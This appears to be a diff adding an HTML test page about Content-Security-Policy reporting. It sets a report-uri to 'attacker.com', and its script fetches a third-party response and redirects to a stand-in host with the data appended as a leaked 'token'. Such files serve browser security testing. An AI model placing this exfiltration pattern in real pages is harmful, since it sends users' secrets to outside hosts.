@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-test' 'report-sample'; report-uri 'https://attacker.com';">
+</head>
+<body>
+    <script>
+        fetch('https://vuln.shhnjk.com/allowcsp.php')
+            .then(response => response.text())
+            .then(data => {
+                // Assume secret token is part of the response
+                document.location.href = "https://a.test/report/?leak=c732779&token=" + encodeURIComponent(data);
+            });
+    </script>
+</body>
+</html>
